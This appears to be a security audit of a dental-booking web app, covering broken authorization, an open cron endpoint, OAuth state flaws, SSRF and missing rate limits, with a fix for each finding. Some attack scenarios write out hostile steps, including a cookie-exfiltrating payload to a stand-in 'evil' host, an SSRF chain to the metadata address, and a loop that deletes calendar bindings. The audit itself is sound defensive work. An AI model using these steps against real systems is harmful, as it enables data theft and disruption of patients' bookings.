# Security Review — Dental Map MVP
_Date: 2026-05-17_

Scope: Next.js 16 App Router + Supabase (auth, Postgres, Storage), Google Calendar OAuth, Resend email, Leaflet maps. Reviewed: middleware, server actions, route handlers, RLS policies (schema + migrations), client forms, cron jobs, OAuth flow, secrets handling.

## Summary
- **Critical: 3** | **High: 6** | **Medium: 5** | **Low: 5** | **Info: 3**

The single biggest pattern is that **every server-side data path uses the Supabase service-role key (bypassing RLS)** while several of those paths run application-level authorization checks that are either missing, incomplete, or trivially bypassable. Combined with weak RLS write policies (almost none defined), the marketplace's authorization model rests entirely on a handful of `if (profile.role !== 'ops')` checks in TypeScript — and at least one of those checks is missing in the most sensitive endpoint (`listAppointmentsForAdmin`), which leaks every booking on the platform to any clinic admin.

---

## Critical (exploit possible right now)

### S1. Any dentist_admin can read every patient booking on the platform (PII disclosure + cross-tenant data leak)
**File:** `lib/bookings/list.ts:24-103`, surfaced at `app/[locale]/(dentist)/dashboard/bookings/page.tsx:19`
**Category:** Broken authorization / cross-tenant data leak / PII disclosure

**Issue:** `listAppointmentsForAdmin()` runs:

```ts
const { data: rows } = await admin
  .from("appointments")
  .select(`id, slot_start, slot_end, status, fee_at_booking_egp,
           patient_phone, patient_note, gcal_event_id, patient_id, …`)
  .order("slot_start", { ascending: true })
  .returns<Row[]>();
```

There is **no filter by the calling user's clinics**. The file's own comment admits this: _"Pilot path: returns ALL appointments. Once we add a clinic_admins table, filter by clinics the user owns."_ The `clinic_admins` table now exists, but the filter was never added. The bookings page only enforces `requireDentistAdmin(locale)`, which lets any approved or self-onboarded clinic admin in.

For each appointment, the code then **resolves the patient's email from `auth.users` via the admin API** (`admin.auth.admin.getUserById`) — so the leaked record includes name, phone, email, slot, fee, gcal event id, and free-text patient notes.

**Attack scenario:** A pilot clinic (or any attacker who signs up via `/signup` choosing the "clinic admin" role and submits a sham clinic — note the role is promoted to `dentist_admin` _before_ the clinic is approved, see `lib/auth/actions.ts:81-88`) navigates to `/en/dashboard/bookings`. They see every patient name, phone, email and visit note for every clinic in the country. Total dataset can be exfiltrated with a single page load. Worse: a single curl after sign-in to the page rendered server-side returns the full set in one round-trip.

**Fix:** Pass the caller id and filter by clinics they admin:

```ts
export async function listAppointmentsForAdmin(profileId: string) {
  const admin = createAdminClient();
  const { data: ca } = await admin
    .from("clinic_admins").select("clinic_id").eq("profile_id", profileId);
  const clinicIds = (ca ?? []).map(r => r.clinic_id);
  if (clinicIds.length === 0) return [];
  const { data: cds } = await admin
    .from("clinic_dentists").select("id").in("clinic_id", clinicIds);
  const cdIds = (cds ?? []).map(r => r.id);
  // …select on appointments .in("clinic_dentist_id", cdIds)…
}
```

Also: have the `ops` role go through a separate explicit path (`listAllAppointments()`) rather than a flag — so the default is fail-closed. Add a regression test that asserts a fresh `dentist_admin` whose clinic has zero bookings sees `length === 0`.

---

### S2. Sign-up lets any user self-promote to `dentist_admin` role immediately, with no verification
**File:** `lib/auth/actions.ts:24-89` (`signUpAction`)
**Category:** Privilege escalation / authorization bypass

**Issue:** The signup form posts `role=clinic_admin` and the server action **trusts that string** and writes the promoted role directly:

```ts
const isClinicAdmin = role === "clinic_admin";
// …
if (isClinicAdmin && created?.user?.id) {
  const { error: promoteErr } = await adminSupa
    .from("profiles")
    .update({ role: "dentist_admin" } as never)
    .eq("id", created.user.id);
}
```

There is no email confirmation, no clinic-association requirement, no manual approval — the role flips on the first request. Combined with **S1** the impact compounds: anyone who knows the sign-up URL can read every booking on the platform within ~10 seconds.

This also auto-unlocks **S3** (delete/disconnect any dentist's calendar token), **S4** (cancel any clinic's Google Calendar event for any booking), and **S6** (call dentist-config server actions for any clinic).

**Attack scenario:** `curl -X POST` to `/signup` form action with `role=clinic_admin`, then load `/en/dashboard/bookings`. Total time-to-PII: under a minute. No clinic onboarding required, no admin review.

**Fix:** Remove the client-controlled `role` field entirely. Default everyone to `patient`. Only promote to `dentist_admin` from `onboardClinicAction` _after_ a clinic row has been inserted and the `clinic_admins` link created — and even then, the role's authorization should require an additional check on `verification_status` (don't trust the role alone). The current behaviour — auto-promote on signup intent — is the wrong default.

---

### S3. `/api/gcal/disconnect` lets any dentist_admin delete any dentist's Google token
**File:** `app/api/gcal/disconnect/route.ts:1-35`
**Category:** Broken object-level authorization / abuse vector

**Issue:** The handler checks only the user's role, never that the user actually admins a clinic that employs the target dentist:

```ts
if (profile?.role !== "dentist_admin" && profile?.role !== "ops") {
  return NextResponse.json({ error: "forbidden" }, { status: 403 });
}
await admin.from("dentist_calendars").delete().eq("dentist_id", dentistId);
```

`dentistId` comes from the request body unchecked. Any signed-in dentist_admin (or anyone who self-promoted per S2) can `POST { "dentistId": "<any-uuid>" }` and wipe the calendar binding for any dentist on the platform — knocking that dentist's calendar offline and forcing the clinic to reconnect.

**Attack scenario:** Hostile competitor signs up as clinic_admin, scrapes dentist IDs from the public `/dentist/[slug]` pages (the page even exposes `dentistId` in joined fetches), then loops `fetch('/api/gcal/disconnect', { method:'POST', body: JSON.stringify({ dentistId, locale:'en' }) })` over every dentist. Every booking made afterward will fail to write to GCal and dentists silently miss appointments until they notice the calendar is disconnected.

**Fix:** Reuse the `requireClinicAdminFor()` pattern that `lib/auth/dentist-actions.ts:8-38` already implements — verify the caller is in `clinic_admins` for at least one `clinic_dentists` row pointing at this dentist (or is `ops`).

---

## High (real risk, possibly not immediately exploitable)

### S4. `cancelBookingAction` ownership check uses patient identity but admin actions on appointments are missing entirely
**File:** `lib/booking/cancel-action.ts:19-82`, `lib/booking/actions.ts:23-225`
**Category:** Authorization gap / abuse vector

**Issue:** The patient cancel path correctly checks `appt.patient_id !== auth.user.id` (good). However, there is **no server action for a clinic admin to cancel/reschedule/mark no-show** on bookings at their clinic — yet `BookingsTable` and `BookingRowActions` are wired up to perform actions on appointment rows. The actions today are read-only (copy/call/whatsapp), but as soon as a "Cancel for patient" or "Mark no-show" lands, it must replicate the per-clinic ownership check or it will inherit S1's blast radius.

Filed at "High" because the current code is read-only, but the data layer (`listAppointmentsForAdmin`) is already cross-tenant, and the pattern in place (admin client + role check only) all but guarantees the next action will be broken too.

**Fix:** When you add the action, build a single `requireBookingOwnerForClinic(appointmentId, profileId)` helper that joins through `clinic_dentists → clinic_admins` and reuse it everywhere.

---

### S5. Cron endpoints are unauthenticated by default
**File:** `lib/cron/auth.ts:9-19`, used by `app/api/cron/finalize-appointments/route.ts`, `app/api/cron/send-reminders/route.ts`, `app/api/cron/send-review-requests/route.ts`
**Category:** Broken authn (fail-open)

**Issue:**

```ts
if (!expected) {
  console.warn("[cron] CRON_SECRET not set — allowing unauthenticated invocation");
  return true;
}
```

If `CRON_SECRET` is unset in production (env-var-rot is common), every cron endpoint becomes a publicly-callable button. Anonymous attackers can:
- `GET /api/cron/send-reminders` — burns through Resend quota by sending reminders early/repeatedly. Idempotency mitigates duplicate sends per appointment, but an attacker can still trigger every legitimate pending reminder on demand (premature notification = social-engineering pretext).
- `GET /api/cron/finalize-appointments` — flips appointments to `completed` ahead of schedule, which immediately allows patients to submit reviews on visits that haven't occurred (`reviews verified insert` RLS policy in `db/schema.sql:251` only checks `status = 'completed'`, not slot_start vs now).
- `GET /api/cron/send-review-requests` — fires the review-ask email window early.

Additionally, this is **also no longer being scheduled by Vercel** because `vercel.json` is empty (`{ "$schema": "…" }` only). The cron jobs run only if someone manually configures the dashboard schedule, in which case they are reachable but uncalled by the platform.

**Fix:** Fail closed when the secret is missing — return 503 with a clear "CRON_SECRET not configured" message instead of allowing. Also use timing-safe comparison (`crypto.timingSafeEqual`) instead of `===` to avoid byte-by-byte leak on the comparison. And declare the schedules in `vercel.json` so they actually run.

---

### S6. `clinic-media` storage bucket is public with no folder-scoping policies — anyone can list/scrape all images
**File:** `scripts/ensure-storage-bucket.mjs:25-45`
**Category:** Information disclosure / cost vector

**Issue:** The bucket is created `public: true` with no row-level storage policies declared. Anyone can `GET https://<project>.supabase.co/storage/v1/object/list/clinic-media` and enumerate every clinic's logo, hero image, and dentist photo. For an MVP with public marketing imagery this is somewhat intentional, but it also means a deny-listed clinic's photos remain hosted and reachable forever — there is no cleanup pathway. There is also no `clinic_admin` write policy declared, which is fine today (uploads happen via the seed script using the service-role key) but means the day someone wires a client-side uploader, anonymous uploads will be allowed by default unless the bucket is reconfigured.

Combined with the absence of in-app upload code, this is **High** rather than Critical, but it should be locked down before any user-facing upload UI ships.

**Fix:** Add Supabase Storage policies that constrain `INSERT`/`UPDATE`/`DELETE` on `storage.objects` to `(bucket_id = 'clinic-media' AND exists (select 1 from clinic_admins where profile_id = auth.uid()))`. Constrain object keys to `<clinic-slug>/...` and validate the slug belongs to the caller's clinic in the upload server action.

---

### S7. OAuth state cookie carries trusted server data unsigned + JSON-parsed
**File:** `app/api/gcal/oauth/start/route.ts:50-62`, `app/api/gcal/oauth/callback/route.ts:13-46`
**Category:** OAuth state weakness

**Issue:** The state cookie is httpOnly and short-lived (10 min), but it's stored as **plain JSON containing the dentistId and userId** that the callback then reads to decide where to write the refresh token:

```ts
res.cookies.set("gcal_oauth_state",
  JSON.stringify({ state, dentistId, userId, locale }),
  { httpOnly: true, sameSite: "lax", … });
```

```ts
parsedState = JSON.parse(stateCookie);  // dentistId/userId from cookie
// later:
await admin.from("dentist_calendars").upsert({
  dentist_id: parsedState.dentistId,
  encrypted_refresh_token: encrypt(refreshToken),
});
```

Because the cookie is httpOnly, an attacker can't read it cross-origin, but the callback then verifies the **current session matches `parsedState.userId`**, so if the session matches the cookie userId, the upsert proceeds — and **`dentistId` is fully attacker-supplied** from the start endpoint. The start endpoint never verifies that the calling user admins the dentist (its comment even says _"Strict ownership check (user admin's this dentist's clinic) is done in the callback"_), and the callback also never verifies that — it just upserts. Net effect: a dentist admin can connect _their own_ Google account to **any dentist's calendar record**, silently redirecting that dentist's booking writes (and freebusy queries used for slot computation) to the attacker's calendar.

This is the same root cause as S3 — missing per-resource ownership check — just via the OAuth path instead of the disconnect path.

**Attack scenario:** Hostile clinic_admin starts the GCal flow with `?dentistId=<victim-uuid>`. Completes their own Google consent. Now bookings for the victim dentist write to the attacker's calendar (PII leak: every booking detail incl. patient phone is in the event description) AND the victim's actual GCal busy times are not respected, leading to double-bookings.

**Fix:** Use `requireClinicAdminFor()` (or its dentist-targeted equivalent) in the start handler before storing the state cookie, and again in the callback before the upsert. Sign the state cookie (HMAC with `APP_ENCRYPTION_KEY`) so it can't be replayed across sessions even if leaked.

---

### S8. `changePasswordAction` re-auths using the **current** session — race + brute-force surface
**File:** `lib/auth/profile-actions.ts:80-90`
**Category:** Auth weakness

**Issue:**

```ts
const { error: reauthErr } = await supabase.auth.signInWithPassword({
  email: auth.user.email,
  password: input.currentPassword,
});
```

Two issues:
1. `signInWithPassword` mutates the session — for the same browser, this rotates tokens mid-request. On the iOS Safari path that the rest of the codebase clearly fought with (see `app/auth-debug`), this can leave the user in a partially-signed state if the password is wrong.
2. There is **no rate limit** on this endpoint, so a hostile caller who hijacks a session (e.g. via stolen cookies on a shared device) can brute-force the user's current password unboundedly to escalate to "knows the password" before changing it.

**Fix:** Use Supabase Auth's reauth flow (`auth.reauthenticate()` with a nonce) or call the admin API to verify the password via a dedicated path that does not rotate the live session. Add per-user rate limiting (5 attempts per 10 min) — this is the only place in the codebase where any password verification happens after sign-in.

---

### S9. `resolveGoogleMapsLocation` is server-side fetch with attacker-controlled URL (SSRF, bounded)
**File:** `lib/clinic/resolve-maps-action.ts:16-71` + `followRedirects` at 73-98
**Category:** Limited SSRF

**Issue:** The action accepts any string the user typed, validates only that it parses as a URL, then calls `followRedirects()` up to 6 hops with `redirect: "manual"`. The host gate is:

```ts
const shouldFollow = SHORT_HOSTS.has(url.hostname) || url.hostname.endsWith("google.com");
```

The hop loop, however, **resolves each subsequent `Location` header relative to the prior URL with no further host validation**:

```ts
currentUrl = new URL(next, currentUrl).toString();
```

So Google (or any host you reach through a `goo.gl`/`google.com` chain) can redirect to an arbitrary URL and the next hop follows it. Combined with the fact that `body` is returned, an attacker submitting a maps URL that legitimately redirects through a chain ending at `http://169.254.169.254/latest/meta-data/…` (the AWS/GCP/Vercel metadata endpoint) could fetch metadata from inside Vercel's serverless runtime. Vercel's serverless functions do not expose IMDS by default, which keeps the impact bounded, but the lack of an allowlist plus arbitrary final hop following + body return is the SSRF primitive.

Additional concern: Nominatim (`geocodeAddress` at line 116) takes `placeName` extracted from the resolved Google URL's `q=` param. That value is fed straight into a Nominatim search — not an SSRF, but a low-cost amplification for log/abuse spam against Nominatim.

**Fix:** Re-validate the host on **every** hop, not just the first. Reject any `Location` whose hostname isn't in the allowlist. Cap response body size (currently `await res.text()` is unbounded — a 100MB Google response would OOM the function). Optionally add a 5-second timeout (the `fetch` has none).

---

## Medium

### M1. Anyone can submit reviews on _their own_ appointments that they self-completed via the cron auth bypass
**File:** `lib/reviews/actions.ts:75-87`, interacts with `lib/cron/auth.ts:9-19`
**Category:** Logic bug / verified-review integrity

**Issue:** The reviews insert is only allowed when `appt.status === "completed"` — by design. But `finalize-appointments` flips `confirmed → completed` for any booking whose `slot_end > 4h ago` and that endpoint is open when `CRON_SECRET` is unset (S5). A user can also wait until their own future appointment passes, then submit a fake-positive review. The mitigations (slot must be 4h in the past) somewhat help, but combined with self-booking and no payment gate, "verified review" is weaker than it looks. Restate: a clinic that fakes positive reviews of itself simply has to book each fake appointment, wait 4 hours, and review. Detecting this is out of scope here but worth knowing.

**Fix:** When a review is submitted, additionally require that the appointment was not cancelled, was created by the patient profile that still exists (not a freshly-deleted account), and add fraud heuristics (one review per (patient_email × clinic) per 90 days, IP capture, etc.).

---

### M2. Phone numbers stored in `appointments.patient_phone` are PII and shown on the ops page with `tel:` links — leaked to any signed-in `ops` user via XSS-as-pivot
**File:** `lib/ops/data.ts:247-258`, `app/[locale]/(ops)/admin/page.tsx:212-218`
**Category:** PII handling / defense-in-depth

**Issue:** The ops page renders patient phone + email as `<a href="tel:...">`. The values are interpolated as React children (safe from XSS), but no escaping is done on the `tel:` attribute value itself. If a malicious patient registered with a phone like `";document.location='http://evil/?c='+document.cookie` and an ops user clicked it, the `tel:` URI's executable surface is limited (no JS scheme), but the input still flows unsanitized into a URL attribute — guidance is to defensively sanitize to digits-only before constructing the href. The whatsapp link does strip non-digits (`replace(/\D/g, "")`) — phone should match.

**Fix:** Use `tel:${b.patientPhone.replace(/\D/g, "")}` consistently (the dashboard booking-row-actions component already does this — line 27).

---

### M3. No rate limiting anywhere — sign-in, sign-up, password-change, booking creation, review submission
**File:** `components/auth/signin-form.tsx`, `lib/auth/actions.ts`, `lib/booking/actions.ts`, `lib/reviews/actions.ts`
**Category:** Abuse / brute-force / spam

**Issue:** None of the user-facing endpoints have a rate limit. Threat profile:
- **Sign-in:** unbounded password guessing against a known email. Supabase Auth has some built-in limits but they're permissive.
- **Sign-up:** unbounded account creation. Each costs a Supabase user row + a Resend welcome-email send. An attacker can drain the Resend quota in minutes (Resend per-day quota at the project's tier).
- **Booking creation:** authenticated users can spam fake bookings against any active clinic_dentist (the booking action does not verify the slot is within working hours — it relies on the calling page having computed valid slots, but a hostile caller can construct any `slotStartIso`). Each successful booking sends a clinic email + writes a GCal event.
- **Map resolve:** `resolveGoogleMapsLocation` triggers a network fetch on every call. Easy DoS.

**Fix:** Add lightweight rate limiting at the proxy/middleware layer (Upstash, Vercel KV, or in-memory) keyed by `userId || ip`. Conservative defaults: 5/min for sign-in, 3/hour for sign-up, 10/hour for bookings per patient, 30/hour for map resolves per IP.

---

### M4. `createBookingAction` accepts any future ISO timestamp — no validation against working hours or slot grid
**File:** `lib/booking/actions.ts:55-73`
**Category:** Logic / abuse / data integrity

**Issue:** The action parses `slotStartIso`, derives `slot_end` from `slot_minutes`, checks DB-side overlap, then inserts. There is no check that the start time aligns with `working_hours`, the slot grid (e.g. multiple of `slot_minutes`), or is in the future. A hostile caller can book a 3 AM Friday slot, a 25-minute offset from the grid, or a slot in the past (which would later get auto-flipped to `completed` by the cron and become reviewable — see M1).

**Fix:** Reuse `computeSlots()` from `lib/availability/compute` to validate that `slotStartIso` is one of the currently-offered slots for this clinic_dentist before inserting. Reject otherwise with `error: "invalid"`.

---

### M5. Patient email/name/phone rendered into HTML emails without escaping (HTML injection in transactional mail)
**File:** `lib/email/resend.ts:75-110` (welcomePatientEmail), 224-301 (clinicOnboardOpsEmail), 303-338 (bookingClinicEmail)
**Category:** HTML injection in email

**Issue:** Template literals interpolate raw user input into HTML strings:

```ts
<h2 style="…">Welcome, ${patientName} 👋</h2>
```

A patient who registers as `<script>...</script>` (caught by `fullName.trim()` only — no length/character validation) or `<img src=x onerror=…>` will have that string land verbatim in the HTML body of the welcome email, the ops onboarding email, and any clinic booking notification. Most modern mail clients sandbox or strip JS, so this is not script execution — but it _is_ HTML injection that can mangle layout, inject phishing links into the clinic's notification email, or display "From: support@dentalmap.app" attack copy that looks like it came from the platform.

Same issue in `bookingClinicEmail` for patient name, phone, email, and the free-text `patientNote` — all interpolated raw into the HTML body via `text.replace(/\n/g, "<br>")` (line 332-336).

**Fix:** HTML-escape every user-supplied substitution before interpolation. A small `escapeHtml(s)` helper that maps `&<>"'` is enough for this code's needs.

---

## Low / Info

### L1. `auth-debug` page is public and dumps cookie names + lengths + user agent
**File:** `app/auth-debug/page.tsx`
**Category:** Information disclosure / reconnaissance

**Issue:** The diagnostic page is exempted from the proxy matcher (`proxy.ts:44`), is reachable by anyone at `/auth-debug`, and prints the user's sb-* cookie names, byte lengths, the user-agent, and the resolved email if a session is present. The email leak is minor (the user is signed in already), but the page should not exist in production. Useful for support, dangerous if mis-shared.

**Fix:** Gate behind `process.env.NODE_ENV !== "production"` or require an ops session.

### L2. No security headers (`Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`)
**File:** `next.config.ts`
**Category:** Defense-in-depth

**Issue:** `nextConfig` declares only `images.remotePatterns` and a rewrite. No `headers()` block. A `Content-Security-Policy` would meaningfully reduce the impact of any future cross-site script injection (currently there's no app-layer injection surface, but the cron auth bypass in S5 makes one of the templates trivially abusable). HSTS isn't strictly required when only served via Vercel (Vercel sets it at the edge), but X-Frame-Options is missing — the site can be framed by any origin, enabling clickjacking against the booking page's "Book" button.

**Fix:** Add a `headers()` block with at minimum `X-Frame-Options: DENY` (or `frame-ancestors 'none'` in CSP), `Referrer-Policy: strict-origin-when-cross-origin`, and a starter CSP.

### L3. Middleware cookie transfer drops options on intl-redirect path
**File:** `proxy.ts:23-33`
**Category:** Defense-in-depth / SameSite handling

**Issue:** When `intlMiddleware` returns a redirect, the proxy copies Supabase cookies onto the new response by reconstructing options from `getAll()`'s output:

```ts
intlResponse.cookies.set(c.name, c.value, {
  domain: c.domain, expires: c.expires, httpOnly: c.httpOnly,
  maxAge: c.maxAge, path: c.path, sameSite: c.sameSite, secure: c.secure,
});
```

`cookies.getAll()` on the request side of Next.js does not always populate `httpOnly`/`secure`/`sameSite` (those are not visible to the request-side cookie store — only to the response side). On the redirect path this can silently strip those flags. Test by signing in once and inspecting the redirected response Set-Cookie headers.

**Fix:** Don't reconstruct — pass `c` directly via `intlResponse.cookies.set(c)` (Next.js cookies API supports this), or pull the Set-Cookie headers from `supaResponse` and forward them verbatim.

### L4. Service-role client used for all public reads where anon + RLS would suffice
**File:** `lib/dentists/list.ts`, `lib/clinics/list.ts`, `lib/reviews/list.ts`, `lib/availability/fetch-busy.ts`, `app/api/clinic-dentists/[id]/slots/route.ts`, `app/[locale]/(patient)/onboard/page.tsx` (loading reference data)
**Category:** Defense-in-depth

**Issue:** Most public list pages (search, areas, specialties, dentist/clinic profile, slot availability) read with the service-role client even though the RLS policies (`db/schema.sql:218-227`) already allow anonymous reads for the published rows they're fetching. Using service-role here means any logic error in the join filter (e.g. forgetting `.eq("is_published", true)`) silently leaks unpublished/pending rows — exactly the failure mode at the heart of S1. The anon client would have failed closed.

**Fix:** Switch the public read paths to `createClient()` from `@/lib/supabase/server`. Reserve `createAdminClient()` for paths that genuinely need to bypass RLS (cron jobs, admin moderation, account deletion). This is a refactor not a one-line fix, but it's the single highest-leverage hardening for the codebase.

### L5. `delete-account` action cancels bookings via direct status flip without checking the cancellation window
**File:** `lib/auth/delete-account-action.ts:68-72`
**Category:** Logic / fairness

**Issue:** A patient can delete their account 10 minutes before their appointment, which cancels the slot bypassing the 2-hour cancellation window the dedicated cancel endpoint enforces (`lib/booking/cancel-action.ts:56`). The clinic loses the slot at no cost to the deleting user. Low impact, but a fairness/abuse vector.

**Fix:** Either prevent account deletion when an appointment is < 2h away, or charge a cancellation fee per the platform's terms.

---

## Positive observations

- **Refresh-token encryption is correct:** AES-256-GCM with random IV, auth tag, base64 envelope (`lib/crypto/encryption.ts`). Key derivation handles both hex and arbitrary-string inputs.
- **OAuth callback validates the session matches the user who started the flow** (`app/api/gcal/oauth/callback/route.ts:50-53`), and deletes the state cookie after use. The `state` parameter is properly random (`randomBytes(24).toString("hex")`).
- **Price tampering is defended server-side:** `onboardClinicAction` recomputes the subscription monthly price from the canonical table (`pricing.ts`) instead of trusting the client (`lib/clinic/onboard-action.ts:152-156`).
- **`appointments_slot_unique` partial index** (`db/schema.sql:184-185`) is the actual race-condition guard for double-booking — the application-layer overlap check is a UX wrapper. Good defense-in-depth.
- **Account deletion correctly anonymizes** `patient_phone`/`patient_note` before the FK cascade (`lib/auth/delete-account-action.ts:86-90`), and uses on-delete-set-null on `appointments.patient_id` so clinic accounting stays intact while patient PII is purged.
- **`.gitignore` covers all secret files** (`.env`, `.env.local`, `*.pem`) and prevents committing the Airtable CSV with clinic contact info.
- **Patient ownership check in cancel and ics endpoints** (`lib/booking/cancel-action.ts:44`, `app/api/booking/[id]/calendar.ics/route.ts:54`) — both correctly verify `appt.patient_id === auth.user.id` before acting.
- **No raw-HTML React escape hatches, no `innerHTML` writes, no untrusted-HTML rendering anywhere in the app.** Leaflet popups use React children, not raw HTML strings.
- **Open redirect via `?next=` is mitigated by ignoring it** — the signin form unconditionally routes by role (`components/auth/signin-form.tsx:48-65`). The `?next=` query param is set by various callers (book, onboard) but never read, so no open-redirect surface exists today.
- **Ops moderation actions are correctly gated server-side** (`lib/ops/actions.ts:11-16`, `assertOps()` before every mutation). Pattern is solid — it's the other admin paths (clinic-scoped) that need to copy it.
